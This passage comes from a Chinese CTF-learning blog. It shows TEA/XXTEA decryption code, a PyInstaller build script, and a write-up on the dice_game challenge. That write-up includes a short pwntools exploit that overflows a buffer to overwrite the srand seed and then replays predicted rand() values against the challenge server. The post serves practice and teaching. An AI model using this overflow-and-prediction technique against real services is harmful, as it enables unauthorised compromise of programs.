sum_val = (delta * <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">                v1 = ((v1 - (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum_val + k[(sum_val &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                sum_val = (sum_val - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">                v0 = ((v0 - (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum_val + k[sum_val &amp; <span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 打包解密结果</span></span><br><span class="line">            decrypted_block = v0.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + v1.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            decrypted.extend(decrypted_block)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> decrypted.<span class="built_in">hex</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;🛑 解密错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>xxtea.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;XXTEA解密算法&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 确保密钥长度为16字节</span></span><br><span class="line">        key_bytes = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key_bytes) &lt; <span class="number">16</span>:</span><br><span class="line">            key_bytes = key_bytes.ljust(<span class="number">16</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(key_bytes) &gt; <span class="number">16</span>:</span><br><span class="line">            key_bytes = key_bytes[:<span class="number">16</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 转换密文为字节</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefABCDEF&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext) <span class="keyword">and</span> <span class="built_in">len</span>(ciphertext) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            cipher_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher_bytes = ciphertext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 确保数据长度是4的倍数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(cipher_bytes) % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">            padding = <span class="number">4</span> - (<span class="built_in">len</span>(cipher_bytes) % <span class="number">4</span>)</span><br><span class="line">            cipher_bytes += <span class="string">b&#x27;\0&#x27;</span> * padding</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 解包为32位整数数组</span></span><br><span class="line">        n = <span class="built_in">len</span>(cipher_bytes) // <span class="number">4</span></span><br><span class="line">        v = [<span class="built_in">int</span>.from_bytes(cipher_bytes[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">        k = [<span class="built_in">int</span>.from_bytes(key_bytes[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># XXTEA解密过程</span></span><br><span class="line">        delta = <span class="number">0x9E3779B9</span></span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">        sum_val = delta * q</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(q):</span><br><span class="line">            e = (sum_val &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">                v[p] = (v[p] - (((v[p-<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) ^ (v[p-<span class="number">1</span>] &gt;&gt; <span class="number">5</span>)) + v[p-<span class="number">1</span>]) ^ (sum_val + k[(p+e) % <span class="number">4</span>])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            v[<span class="number">0</span>] = (v[<span class="number">0</span>] - (((v[n-<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) ^ (v[n-<span class="number">1</span>] &gt;&gt; <span class="number">5</span>)) + v[n-<span class="number">1</span>]) ^ (sum_val + k[e])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            sum_val = (sum_val - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打包解密结果</span></span><br><span class="line">        decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> v:</span><br><span class="line">            decrypted.extend(num.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> decrypted.<span class="built_in">hex</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;🛑 解密错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 示例1: 解密十六进制格式的密文</span></span><br><span class="line">    ciphertext = <span class="string">&quot;0123456789abcdef&quot;</span>  <span class="comment"># 示例密文（十六进制）</span></span><br><span class="line">    key = <span class="string">&quot;1234567890123456&quot;</span>        <span class="comment"># 16字节密钥</span></span><br><span class="line">    plaintext = decrypt(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 示例2: 解密字符串格式的密文</span></span><br><span class="line">    ciphertext = <span class="string">&quot;encrypted_data&quot;</span>    <span class="comment"># 示例密文（字符串）</span></span><br><span class="line">    key = <span class="string">&quot;mysecretkey1234&quot;</span>          <span class="comment"># 16字节密钥</span></span><br><span class="line">    plaintext = decrypt(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密结果: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>package.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_dependencies</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查并安装必要的依赖&quot;&quot;&quot;</span></span><br><span class="line">    required = [</span><br><span class="line">        <span class="string">&#x27;pyinstaller&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;opencv-python&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pillow&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> tkinter</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误: 需要安装 tkinter (通常是 Python 自带)&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> package <span class="keyword">in</span> required:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">__import__</span>(package)</span><br><span class="line">        <span class="keyword">except</span> ImportError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在安装 <span class="subst">&#123;package&#125;</span>...&quot;</span>)</span><br><span class="line">            subprocess.check_call([sys.executable, <span class="string">&quot;-m&quot;</span>, <span class="string">&quot;pip&quot;</span>, <span class="string">&quot;install&quot;</span>, package])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exe</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;构建 EXE 文件&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 获取当前脚本所在目录</span></span><br><span class="line">    base_dir = Path(__file__).parent</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 视频文件路径 (确保视频文件存在)</span></span><br><span class="line">    video_file = <span class="string">&quot;富士山的星空.mp4&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (base_dir / video_file).exists():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 视频文件 <span class="subst">&#123;video_file&#125;</span> 不存在!&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 图标文件路径 (可选)</span></span><br><span class="line">    icon_file = <span class="string">&quot;linkpwn.ico&quot;</span></span><br><span class="line">    icon_param = <span class="string">f&quot;--icon=<span class="subst">&#123;icon_file&#125;</span>&quot;</span> <span class="keyword">if</span> (base_dir / icon_file).exists() <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 加密模块列表</span></span><br><span class="line">    crypto_modules = [<span class="string">&#x27;xor1&#x27;</span>, <span class="string">&#x27;rc4&#x27;</span>, <span class="string">&#x27;tea&#x27;</span>, <span class="string">&#x27;xtea&#x27;</span>, <span class="string">&#x27;xxtea&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构建 PyInstaller 命令</span></span><br><span class="line">    cmd = [</span><br><span class="line">        <span class="string">&#x27;pyinstaller&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--onefile&#x27;</span>,           <span class="comment"># 打包成单个文件</span></span><br><span class="line">        <span class="string">&#x27;--windowed&#x27;</span>,           <span class="comment"># 不显示控制台窗口</span></span><br><span class="line">        <span class="string">&#x27;--noconsole&#x27;</span>,          <span class="comment"># 同 --windowed</span></span><br><span class="line">        <span class="string">&#x27;--clean&#x27;</span>,              <span class="comment"># 清理临时文件</span></span><br><span class="line">        <span class="string">&#x27;--noconfirm&#x27;</span>,          <span class="comment"># 覆盖输出目录不提示</span></span><br><span class="line">        <span class="string">&#x27;--name=linkpwntool&#x27;</span>,   <span class="comment"># 输出文件名</span></span><br><span class="line">        <span class="string">&#x27;--add-data&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;video_file&#125;</span>;.&#x27;</span>,  <span class="comment"># 添加视频文件</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 添加图标 (如果存在)</span></span><br><span class="line">    <span class="keyword">if</span> icon_param:</span><br><span class="line">        cmd.append(icon_param)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 添加加密模块</span></span><br><span class="line">    <span class="keyword">for</span> mod <span class="keyword">in</span> crypto_modules:</span><br><span class="line">        mod_file = <span class="string">f&quot;<span class="subst">&#123;mod&#125;</span>.py&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (base_dir / mod_file).exists():</span><br><span class="line">            cmd.extend([<span class="string">&#x27;--add-data&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;mod_file&#125;</span>;.&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;警告: 加密模块 <span class="subst">&#123;mod_file&#125;</span> 不存在!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 添加主程序</span></span><br><span class="line">    cmd.append(<span class="string">&#x27;main.py&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 执行打包命令</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;开始打包...&quot;</span>)</span><br><span class="line">        subprocess.check_call(cmd)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n打包成功! EXE 文件位于 dist/ 目录&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 复制视频文件到 dist 目录 (PyInstaller 的 --add-data 有时会失效)</span></span><br><span class="line">        <span class="keyword">if</span> (base_dir / <span class="string">&#x27;dist&#x27;</span>).exists():</span><br><span class="line">            <span class="keyword">import</span> shutil</span><br><span class="line">            shutil.copy(base_dir / video_file, base_dir / <span class="string">&#x27;dist&#x27;</span> / video_file)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;已复制视频文件到 dist 目录&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n打包失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n发生错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    check_dependencies()</span><br><span class="line">    build_exe()</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 package.py  #mp4可自己选择把脚本中的mp4换成你自己mp4的名字；或者你直接把自己的MP4名字换成富士山的星空</span><br></pre></td></tr></table></figure>

<p>运行成功在dist下有个exe，点击运行即可</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/03/25/seed%E7%9A%84%E8%A6%86%E7%9B%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/03/25/seed%E7%9A%84%E8%A6%86%E7%9B%96/" class="post-title-link" itemprop="url">seed的覆盖</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-03-25 21:09:03" itemprop="dateCreated datePublished" datetime="2025-03-25T21:09:03+08:00">2025-03-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:04:25" itemprop="dateModified" datetime="2025-09-23T21:04:25+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/stack/" itemprop="url" rel="index"><span itemprop="name">stack</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这里主要记一下seed的覆盖，srand(seed);v2 &#x3D; rand() % 6 + 1;其中rand的生成是依靠seed的，我们只要找到seed与输入值之间的偏移将seed修改为我们想要的值，就可以预测rand的生成</p>
<p>这是攻防世界dice_game的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="string">&#x27;57464&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload=<span class="number">0x40</span>*<span class="string">b&quot;a&quot;</span>+p64(<span class="number">0</span>)  <span class="comment">#buf与seed的偏移是0x40</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">	a.append(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	p.recv()</span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="linkpwn"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">linkpwn</p>
  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">74</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/linkpwn" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:dkj20060328@qq.com" title="E-Mail → mailto:dkj20060328@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/linkpwn" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1827600686&auto=1&height=66"></iframe>
    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">linkpwn</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>

<!--单击显示文字-->
<script type="text/javascript" src="/js/clickshowtext.js"></script>

<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/clicklove.js"></script>

<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
<script type="text/javascript" src="/js/fireworks.js"></script>
